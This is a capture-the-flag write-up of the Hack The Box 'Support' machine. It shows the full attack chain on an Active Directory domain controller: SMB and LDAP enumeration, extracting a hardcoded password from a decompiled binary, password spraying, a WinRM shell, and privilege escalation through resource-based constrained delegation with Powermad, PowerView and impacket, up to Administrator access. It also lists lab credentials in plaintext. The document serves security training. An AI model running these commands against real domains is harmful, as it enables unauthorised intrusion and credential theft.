---
title: Support
draft: false
tags:
---
![[Pasted image 20250224170258.png]]

Machine: https://app.hackthebox.com/machines/484

# Enumeration
## Service & Version
- We can use [[content/Tools/Nmap|Nmap]] to enumerate de opened ports
```bash
nmap -p- -sS -n -Pn --min-rate 5000 10.10.11.174 -oG allPorts
```
> [!example]- Result
> ![[Pasted image 20250224171001.png]]

- As we can see, we have a windows machine (127 ttl and usuals windows services), now run a service version scan and use some common scripts
```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49674,49676,49699,49737 -sVC -n -Pn --min-rate 5000 10.10.11.174 -vvv -oN Targeted
```
> [!Example]- Result
>![[Pasted image 20250224171441.png]]

Domain name: `support.htb`, lets add this locations to `/etc/hosts`
> [!Example]- Result
> ![[Pasted image 20250224193027.png]]
## DNS
- Using [[dig]], but i didnt get nothing especial, as well as using other utilities:
```bash
dig 10.10.11.174
```
> [!Example]- Result
> ![[Pasted image 20250224172223.png]]

## LDAP
- We can use [[ldapsearch]] and try to enumerate without credentials, but nothing interesting
```bash
ldapsearch -x -H ldap://10.10.11.174 -D '' -w '' -b "DC=support,DC=htb"  
```
>[!example]- Result
>![[Pasted image 20250224174835.png]]

## SMB
- Using [[content/Tools/Nmap|Nmap]] we can enumetate the supported dialects, but there is not a lot of info
```bash
nmap -p445 -script "smb*" -T5 -n -sS -Pn 10.10.11.174 
```
> [!Example]- Result
> ![[Pasted image 20250224174140.png]]

- Using [[smbclient]] lets try to enumerate shares with a NULL session
```bash
smbclient -N -L //10.10.11.174
```
>[!Example]- Result
>![[Pasted image 20250224184040.png]]

- lets check the privilegues that we have on this shares using [[smbmap]]
>[!Warning] If we want to use a null session in [[smbmap]] we need to write "none" in the "-u" field, This dont works `-u ''`
```bash
smbmap -H 10.10.11.174 -u none
```
> [!Example]- Result
> ![[Pasted image 20250224192150.png]]

- Grate, now we can see the shares, and there are some interestrings folder like "support-tools" lets take a look
```bash
smbclient -N //10.10.11.174/support-tools
ls
mget *
```
> [!Example]- Result
> ![[Pasted image 20250224185725.png]]

- There are a lot of `.exe` we can try to run [[strings]] (`-e l` is useful to windows binaries l = 16bits), without `-e l`, maybe a user '0xdf'
```bash
strings UserInfo.exe | less
```
>[!Example]- Result
>![[Pasted image 20250224194343.png]]
- with `-e l`, maybe more users 'armando, ldap'
```bash
strings -e l UserInfo.exe | less
```
>[!Example]- Result
>![[Pasted image 20250224195633.png]]

## Kerberos
- Maybe we can try to test this users using [[kerbrute]], first we can try a random username
```bash
kerbrute_linux_amd64 userenum -d support.htb --dc 10.10.11.174 /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt
```
>[!Example]- Result
>![[Pasted image 20250224201525.png]]

- now a wordlist with the found users
```bash
kerbrute_linux_amd64 userenum -d support.htb --dc 10.10.11.174 usernames
```
>[!Example]- Result
>![[Pasted image 20250224200619.png]]

- When we are on a AD enviroment and we have valid username we can use [[impacket-GetNPUsers]] (To get a tgt) & [[impacket-GetUserSPNs]] (to perform a kerberoasting attack, we need valid credentials)
```bash
impacket-GetNPUsers support.htb/ldap -no-pass
or
impacket-GetNPUsers support.htb/ldap -no-pass -k
```
>[!Example]- Result
>![[Pasted image 20250224204158.png]]
>![[Pasted image 20250224204303.png]]

- There are no user with this flag on "UF_DONT_REQUIRE_PREAUTH" so lets try brute forcing the pass with [[kerbrute]] but... nothing
```bash
kerbrute_linux_amd64 bruteuser -d support.htb --dc 10.10.11.174 /usr/share/wordlists/rockyou.txt usernames -t 200
```
>[!Example]- Result
>![[Pasted image 20250224230657.png]]

## Foothold
>[!info]- we have to be connected via VPN as well as set the domain in C:\Windows\System32\drivers\etc\hosts (windows)
>![[Pasted image 20250224232658.png]]
>![[Pasted image 20250224234031.png]]

- going back to the executables lets try to run it on a local environment
```cmd
.\UserInfo.exe
```
>[!example]- Result
>![[Pasted image 20250224231706.png]]

- looks like we can get info
>[!example]- Result
>![[Pasted image 20250224234349.png]]

- if the program can read via ldap (as we saw using [[strings]]) maybe is performing authentication, and it is sending the credencials, so we can check it using [[wireshark]] (a protable executable is include with the machine), so as fast as we send the request we see the credentials
```shell
.\UserInfo.exe user -username raven.clifton
```
>[!example]- Request
>![[Pasted image 20250224235216.png]]

- but nothing interesting here
>[!Example]- Result
>![[Pasted image 20250225001524.png]]

### Decompile
- At this point we know that `userinfo.exe` make a ldap connection so the credentials are used in here, so lets try to decompile with [[dnSpy]]
>[!example]- Result
>![[Pasted image 20250225110253.png]]

- perfect, so we have:
	- The enconded password: `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`
	- The key: `armando`
	- And the process
```c#
public static string getPassword()
{
	byte[] array = Convert.FromBase64String(Protected.enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
	}
	return Encoding.Default.GetString(array2);
}
```
- Here we hace the plan password, so we can inicialice the program on debug mode and set a breakpoint, when the function is used
>[!example]- Result
>![[Pasted image 20250225114348.png]]

- So the credentials are `ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
>[!example]- Result
>![[Pasted image 20250225114418.png]]

- To be sure we can test the credentials
```bash
crackmapexec smb 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```
>[!example]- Result
>![[Pasted image 20250225115432.png]]

### winrm
- we can try this credentials to authenticate us in winrm protocol (port `5985`)
```bash
crackmapexec winrm 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```
>[!example]- Result
>![[Pasted image 20250225141743.png]]

### Request TGT / TGS
- we can try to get a ticket but nothing
```bash
impacket-GetUserSPNs support.htb/ldap:'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -request
```
>[!example]- Request
>![[Pasted image 20250225145454.png]]

### RPC (port 135)
- As we have valid creeds we can try to get authenticated via rpc usgin [[rpcclient]]
```bash
rpcclient 10.10.11.174 -U 'support.htb/ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```
>[!example]- Result
>![[Pasted image 20250225150800.png]]

- we have access, so we can enumerate some things like:
 Users: `enumdomusers`:
>[!example]- Result 
>![[Pasted image 20250225151506.png]]
``

Display all users information: `querydispinfo`:
>[!example]- Result
>![[Pasted image 20250225152913.png]]
>In some cases we can find useful information

Groups: `enumdomgroups`:
>[!example]- Result
>![[Pasted image 20250225151955.png]]

Get user members of 'domain admins' group: `querygroupmem 0x200`:
>[!example]- Result
>![[Pasted image 20250225152453.png]]

Get user from "RID": `queryuser 0x1f4`:
>[!example]- Result
>![[Pasted image 20250225152559.png]]

- We dont see nothing especial, so lets make a valid users list in order to preform a brute forcing attack
```bash
rpcclient 10.10.11.174 -U 'support.htb/ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -vE '0x*' | tr -d '[]' > usernames
```
>[!example]- Result
>![[Pasted image 20250225153505.png]]

### Password Spraying 
- we can try to reuse the found creadential in all users usin [[kerbrute]] (same result using [[crackmapexec]])
```bash
kerbrute_linux_amd64 passwordspray usernames 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --dc 10.10.11.174 -d support.htb
```
>[!example]- Result
>![[Pasted image 20250225154148.png]]

# Lateral Movement
### Ldap (Using creds)
- if we looking for information about the found users, we can see something interesting in the user 'support'
```bash
ldapsearch -H ldap://10.10.11.174 -x -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -D 'ldap@support.htb' -b "DC=support,DC=htb" "*"
```
>[!example]- Result
>![[Pasted image 20250225162659.png]]

- We test the password and perfect, is a valid password
```bash
crackmapexec smb 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
```
>[!example]- Result
>![[Pasted image 20250225162933.png]]

- To better understanding we can use [[ldapdomaindump]] or [[bloodhaund-python]] to have a visual map 
```bash
ldapdomaindump 10.10.11.174 -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --authtype SIMPLE
```

or (and then import the result into [[BloodHaund]])
```bash
bloodhound-python -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -c ALL -ns 10.10.11.174 --dns-tcp
```
> [!example]- Result
> ![[Pasted image 20250225164907.png]]

- now we know that 'support' user is part of the group 'remote management users' so lets try to validate it 
```bash
crackmapexec winrm 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
```
>[!example]- Result
>![[Pasted image 20250225165111.png]]

- lets get a revershell using [[evil-winrm]]
```bash
 evil-winrm --ip 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
```
>[!example]- Result
>![[Pasted image 20250225165347.png]]

# Privilege Escalation
- If we check the [[BloodHaund]] diagram we can see that we are part of the group 'shared support accounts' and if we check this group, we see that have full control over the DC0 (DC machine)
>[!example]- Result
>![[Pasted image 20250225172951.png]]

### RBCD (resource based constrained delegation attack)
- To perform this attack we are going to use [[rcbd.py]] (as well we can use [[content/Tools/Rubeus.exe|Rubeus.exe]] like the example of hacktricks), more info [here](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html#attack), first, we crate a computer object inside domaing using [[powermad]], so upload [[powermad]] and [[PowerView]] to the victim machine
```bash
upload /home/jr117/Desktop/jr117/herramientas/Powermad
upload /home/jr117/Desktop/jr117/herramientas/PowerTools/PowerView
Import-Module ./Powermad/Powermad.ps1
Import-Module .\PowerView.ps1
```
>[!example]- Result
>![[Pasted image 20250225180025.png]]

- now lets create the machine account (remember de name and the password)
```bash
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
>[!example]- Result
>![[Pasted image 20250225180440.png]]

>[!info]- we can check it using powerview
>```powershell
>Get-DomainComputer SERVICEA
>```
>![[Pasted image 20250225181658.png]]

- Configure the object
```powershell
$ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
#Check that it worked
Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

>[!example]- Result
>![[Pasted image 20250225182637.png]]

- now in our machine we can use [[impacket-getST]] 
```bash
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/SERVICEA:123456
```
>[!example]- Result
>![[Pasted image 20250225183808.png]]

- We can use this `.ccache` to authenticate into the dc using [[impacket-psexec]]
>[!Warning] We need to set this environment variable
>```bash
>export KRB5CCNAME=Administrator.ccache
>```

```bash
impacket-psexec -k dc.support.htb
```
>[!example]- Result
>![[Pasted image 20250225184515.png]]



